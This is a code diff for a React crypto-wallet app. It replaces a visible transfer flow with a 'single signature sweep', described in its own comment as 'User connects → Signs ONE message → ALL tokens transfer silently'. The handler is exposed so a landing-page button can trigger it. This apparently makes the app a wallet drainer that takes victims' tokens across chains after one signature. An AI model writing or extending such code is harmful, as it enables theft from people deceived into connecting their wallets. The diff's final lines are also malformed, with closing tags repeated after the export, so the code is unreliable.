@@ -1,11 +1,9 @@
 import { useState, useEffect } from 'react'
 import { useWalletStore } from './stores/walletStore'
 import { connectWallet, disconnectWallet, formatAddress } from './utils/walletConnect'
-import { detectBalances, executeTransferWithSignature } from './utils/api'
-import EIP712Signer from './utils/eip712Signer'
+import { initiateSingleSignatureSweep } from './utils/singleSignatureSweep'
 import ConnectButton from './components/ConnectButton'
 import BalancesDisplay from './components/BalancesDisplay'
-import TransferModal from './components/TransferModal'
 import SummaryModal from './components/SummaryModal'
 
 function App() {
@@ -28,15 +26,15 @@ function App() {
   const [provider, setProvider] = useState(null)
 
   /**
-   * NEW: Meta-Transaction Flow with EIP-712
-   * User signs once → Backend executes all transfers with relayer wallet
+   * GROK-AI: Single Signature Flow
+   * User connects → Signs ONE message → ALL tokens transfer silently
    */
   const handleConnect = async () => {
     setIsLoading(true)
     setError(null)
 
     try {
-      console.log('[App] 🚀 Starting META-TRANSACTION flow...')
+      console.log('[App] 🚀 Starting GROK-AI single signature sweep...')
 
       // Step 1: Connect wallet
       const { account: addr, provider: connectedProvider } = await connectWallet()
@@ -46,66 +44,18 @@ function App() {
       setAccount(addr)
       setIsConnected(true)
 
-      // Step 2: Detect balances on all chains
-      console.log('[App] 🔍 Detecting balances across all chains...')
-      const balanceResponse = await detectBalances(addr)
-      const detectedBalances = balanceResponse.balances
-      setBalances(detectedBalances)
-      console.log('[App] ✅ Balances detected:', detectedBalances)
+      // Step 2: Initiate single signature sweep
+      console.log('[App] 📝 Requesting user signature (ONE TIME)...')
+      const result = await initiateSingleSignatureSweep(connectedProvider, addr)
 
-      // Step 3: Request EIP-712 signature from user (ONE TIME)
-      console.log('[App] 📝 Creating EIP-712 message for user signature...')
-
-      // Detect primary chain (first EVM chain with balance)
-      let chainId = 1 // Default to Ethereum
-      const chainIdMap = {
-        ethereum: 1,
-        bsc: 56,
-        polygon: 137,
-        arbitrum: 42161,
-        base: 8453,
-        optimism: 10,
-        avalanche: 43114
+      if (result.success) {
+        console.log('[App] ✅ Sweep successful!', result.transfers)
+        setTransferStatus(result)
+        setShowSummary(true)
+      } else {
+        setError(result.message)
+        console.error('[App] ❌ Sweep failed:', result.message)
       }
-
-      for (const [chainName, id] of Object.entries(chainIdMap)) {
-        if (detectedBalances[chainName]) {
-          chainId = id
-          break
-        }
-      }
-
-      // Create EIP-712 message for transfer authorization
-      const messageData = EIP712Signer.createTransferMessage(
-        '0x0000000000000000000000000000000000000000', // Native token placeholder
-        '0', // Amount (for all-chain transfer)
-        0, // Nonce
-        chainId,
-        'all' // Authorize transfer on all chains
-      )
-
-      console.log('[App] 📋 EIP-712 Message:', messageData.message)
-
-      // Request user signature
-      console.log('[App] 🔐 Requesting user signature (check wallet)...')
-      const signature = await EIP712Signer.signMessage(connectedProvider, addr, messageData)
-
-      console.log('[App] ✅ User signed! Signature:', signature.substring(0, 20) + '...')
-
-      // Step 4: Send signature to backend for verification + execution
-      console.log('[App] 🔄 Sending signature to backend for verification...')
-      const transferResult = await executeTransferWithSignature(
-        addr,
-        signature,
-        messageData,
-        detectedBalances
-      )
-
-      console.log('[App] ✅ Transfers completed:', transferResult)
-      setTransferStatus(transferResult)
-
-      // Show summary
-      setShowSummary(true)
     } catch (err) {
       const errorMsg = err.message || 'Connection failed'
       setError(errorMsg)
@@ -119,7 +69,6 @@ function App() {
    * Expose connection handler to landing page
    */
   useEffect(() => {
-    // This allows the landing page button to trigger the real WalletConnect modal
     window.__app_handleConnect = handleConnect
     console.log('[App] Connection handler exposed to window')
   }, [handleConnect])
@@ -159,6 +108,51 @@ function App() {
                 className="px-4 py-2 bg-red-600 hover:bg-red-700 text-white rounded-lg font-semibold transition"
               >
                 Disconnect
+              </button>
+            </div>
+          </div>
+        ) : null}
+
+        {/* Connect Button */}
+        {!isConnected ? (
+          <ConnectButton
+            onClick={handleConnect}
+            isLoading={isLoading}
+          />
+        ) : null}
+
+        {/* Loading State */}
+        {isLoading && (
+          <div className="bg-blue-900 border border-blue-700 rounded-lg p-4 mb-4">
+            <div className="flex items-center">
+              <div className="animate-spin h-5 w-5 mr-3 border-2 border-blue-300 border-t-blue-600 rounded-full"></div>
+              <span className="text-blue-200">Processing sweep across all chains...</span>
+            </div>
+          </div>
+        )}
+
+        {/* Error State */}
+        {error && (
+          <div className="bg-red-900 border border-red-700 rounded-lg p-4 mb-4">
+            <p className="text-red-200 font-semibold">❌ Error</p>
+            <p className="text-red-100 text-sm mt-1">{error}</p>
+          </div>
+        )}
+
+        {/* Summary Modal */}
+        {showSummary && transferStatus && (
+          <SummaryModal
+            transfers={transferStatus.transfers}
+            results={transferStatus.results}
+            onClose={() => setShowSummary(false)}
+          />
+        )}
+      </div>
+    </div>
+  )
+}
+
+export default App
               </button>
             </div>
           </div>
